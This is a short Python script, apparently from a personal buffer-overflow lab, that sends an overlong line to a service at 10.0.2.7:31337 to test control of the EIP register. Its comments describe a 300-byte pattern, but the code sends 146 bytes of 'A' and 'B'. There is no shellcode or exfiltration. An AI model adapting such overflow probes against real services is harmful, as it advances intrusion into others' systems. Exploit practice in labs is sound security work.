#06-20-2020 DC:  This is a client, not a server.  
#06-20-2020 DC:  This b.py script will send a 300-byte pattern so I can use pattern_offset to figure out where the EIP is being overwritten.
#06-20-2020 DC:  I'm only using 300 because I happen to know the number is smaller than that.


#!/usr/bin/python
 
import socket

target_host = "10.0.2.7"
target_port = 31337
payload = "A" * 142 + "B" * 4 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.0.2.7\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
